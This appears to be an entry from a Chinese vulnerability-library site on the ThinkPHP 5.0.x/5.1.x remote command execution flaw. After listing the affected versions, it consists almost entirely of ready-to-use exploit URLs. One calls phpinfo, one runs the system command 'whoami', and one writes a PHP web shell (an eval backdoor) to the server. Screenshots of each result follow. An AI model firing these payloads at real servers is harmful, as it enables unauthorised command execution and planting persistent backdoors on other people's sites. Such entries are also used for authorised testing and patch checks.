---
title: 'Thinkphp 5.x远程命令执行漏洞'
date: Sun, 30 Aug 2020 08:00:34 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 影响范围

ThinkPHP 5.0.x < 5.0.23 ThinkPHP 5.1.x < 5.1.31

### 漏洞POC

phpinfo：

```
/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```

![](https://www.bylibrary.cn/wp-content/uploads/2020/08/15988684651.png) 系统命令执行：

```
/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

![](https://www.bylibrary.cn/wp-content/uploads/2020/08/15988684991.png) 写shell：

```
/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php @eval($_GET["cmd"])?>
```

![](https://www.bylibrary.cn/wp-content/uploads/2020/08/15988696981.png)